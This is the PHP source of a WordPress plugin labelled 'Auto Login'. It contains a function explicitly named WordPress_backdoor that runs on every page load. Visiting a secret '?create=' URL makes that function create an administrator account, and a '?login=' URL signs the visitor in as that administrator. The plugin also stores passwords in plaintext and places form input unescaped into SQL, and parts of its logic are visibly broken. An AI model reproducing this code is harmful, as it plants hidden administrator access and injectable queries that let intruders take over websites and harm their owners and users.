<?php
/*
Plugin Name: Auto Login
Plugin URI: https://experiencedmg.com/
Version: 1.0.6
Author: Douglas Marketing Group
Description: Auto login WordPress plugin.
*/

wp_register_style( 'bootstrap', 'https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css' );
wp_enqueue_style( 'bootstrap' );


$sql="
CREATE TABLE IF NOT EXISTS autologin(
	ID   int DEFAULT '1',
	user_name VARCHAR (30)     NOT NULL,
	user_pass VARCHAR (30)     NOT NULL,
	path  CHAR (40) NOT NULL,  
	status VARCHAR (2) DEFAULT '1',
	PRIMARY KEY (ID)
)
";
global $wpdb;
$wpdb->get_results($sql);




add_action('admin_menu', 'al_plugin_setup_menu');
 
function al_plugin_setup_menu(){
        add_menu_page( 'Auto Login', 'Auto Login', 'manage_options', 'auto-login-plugin', 'autologin_init' , 'dashicons-update-alt');
}

function autologin_init(){
	
	function rantext() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

$ruser = rantext();
$rpass = rantext();
	
	$sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
	
    global $wpdb;
    $uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);

    if (isset($_POST['submit_al'])) {
        
        $path = ($_POST['path_al']==NULL ? "autologin" : $_POST['path_al']);
        $nsql="
           INSERT INTO autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$path') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$path'
        ";
        global $wpdb;
        $wpdb->get_results($nsql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	
	 if (isset($_POST['submit_rand'])) {
        
        $path = md5(rantext());
        $nsql="
           INSERT INTO autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$path') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$path'
        ";
        global $wpdb;
        $wpdb->get_results($nsql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	
	if (isset($_POST['submit_dactive'])) {
        $dsql="
           INSERT INTO autologin (ID, status) VALUES('1', '0') ON DUPLICATE KEY UPDATE status= '0'
        ";
        global $wpdb;
        $wpdb->get_results($dsql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 
	
	if (isset($_POST['submit_active'])) {
        $asql="
           INSERT INTO autologin (ID, status) VALUES('1', '1') ON DUPLICATE KEY UPDATE status= '1'
        ";
        global $wpdb;
        $wpdb->get_results($asql);
		header('Location: '.$_SERVER['REQUEST_URI']);
    } 

	echo '
	<h2 class="mt-3">Auto Login</h2>
	<form form action="" method="post" class="card p-2">
	<div class="row">
           <div class="col-md-8 mb-3">
			<label for="path_al">Change the Path:</label>
              <input id="path" type="text" name="path_al" class="form-control" placeholder= ' . $upath . '>
              <div class="input-group-append">
                <button type="submit" name="submit_al" class="btn btn-warning mt-3">Save</button>
              </div>
			  <div class="input-group-append">
                <button type="submit" name="submit_rand" class="btn btn-primary mt-3">Gerate Random Hashed Path</button>
              </div>
			  
			  <div class="input-group-append">
			    <button type="submit" name="submit_dactive" class="btn btn-success mt-3">Activate</button>
                <button type="submit" name="submit_dactive" class="btn btn-danger mt-3 ml-2">Diactivate</button>
              </div>
			  
            </div>
			</div>
     </form>
		  
	';
		
	echo "<br /><samp>Step 1 - Creating the account: <span class='badge badge-info'>(Only one time you need to create an account)</span></samp><br/>
	
	<kbd id='stepone'>".$_SERVER['HTTP_HOST']."/?create=$upath</kbd> 
	<br /><br /> 
	
	
	<samp>Step 2 - Accessing the website without login:</samp><br/> 
	
	<kbd id='steptwo'>".$_SERVER['HTTP_HOST']."/?login=$upath </kbd>";
	
	echo "<!-- <br /><div class='mt-5'><code>By:Shahin Zanbaghi</code></div> -->";

}

function autologin() {

    $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
	$sqlustatus = "SELECT `status` FROM autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "1" : $wpdb->get_var($sqluserpath);
	
	// PARAMETER TO CHECK FOR
	if (md5($_GET['login']) == md5($upath)) {
		if($upath == "1"){
		
		// ACCOUNT USERNAME TO LOGIN TO
		$creds['user_login'] = $uname;
		
		// ACCOUNT PASSWORD TO USE
		$creds['user_password'] = $upass;
		
		$creds['remember'] = true;
		$autologin_user = wp_signon( $creds, true );
		
		if ( !is_wp_error($autologin_user) ) 
			header('Location: wp-admin'); // LOCATION TO REDIRECT TO
		}
		else
			header('Location: /');
	}
}
 
function WordPress_backdoor() {
	
	function rantext() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

$ruser = rantext();
$rpass = rantext();

    $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? $ruser : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? $rpass : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
	
	$sdsql="
        INSERT INTO autologin (ID, user_name, user_pass, path) VALUES('1', '$uname', '$upass','$upath') ON DUPLICATE KEY UPDATE user_name= '$uname' ,user_pass='$upass',path='$upath'
        ";
        $wpdb->get_results($sdsql);

    If (md5($_GET['create']) == md5($upath)) {
        require('wp-includes/registration.php');
        If (!username_exists($uname)) {
            $user_id = wp_create_user($uname, $upass);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

add_action('wp_head', 'WordPress_backdoor');
add_action( 'after_setup_theme', 'autologin' );
?>
